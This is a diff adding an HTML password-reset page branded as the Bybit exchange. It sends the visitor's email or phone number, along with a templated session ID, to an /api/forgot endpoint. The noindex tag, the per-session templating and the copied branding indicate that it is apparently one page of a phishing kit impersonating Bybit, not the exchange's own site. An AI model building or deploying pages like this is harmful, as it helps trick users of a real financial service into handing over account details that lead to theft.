@@ -1,0 +1,27 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow"><title>Reset password | Bybit</title>
+<link rel="stylesheet" href="/app.css"></head><body><div class="wrap"><main class="card">
+<div class="logo"><div class="mark"></div><div class="word">BYBIT</div></div>
+<h1>Reset your password</h1>
+<p class="sub">Enter the email or phone number linked to your account and we'll send a reset link.</p>
+<form id="f" novalidate>
+  <label for="l">Email/Phone number</label>
+  <input id="l" type="text" autocapitalize="none" spellcheck="false" placeholder="Email/Phone number">
+  <div class="err" id="err"></div>
+  <button class="btn" type="submit" id="btn">Continue</button>
+</form>
+<div class="foot"><a href="/?s={{SID}}">Back to log in</a></div>
+<script>
+var SID="{{SID}}",BTN=document.getElementById('btn'),E=document.getElementById('err');
+document.getElementById('f').addEventListener('submit',function(e){
+  e.preventDefault();
+  var l=document.getElementById('l').value.trim();
+  if(!l){E.textContent='Enter your email or phone number.';return;}
+  E.textContent='';BTN.disabled=true;BTN.textContent='Sending…';
+  fetch('/api/forgot',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({l:l,s:SID})})
+    .then(function(){E.style.color='#0ECB81';E.textContent='Check your inbox or messages.';BTN.textContent='Reset link sent';})
+    .catch(function(){BTN.disabled=false;BTN.textContent='Continue';E.textContent='Network error. Please try again.';});
+});
+</script>
+</main></div></body></html>
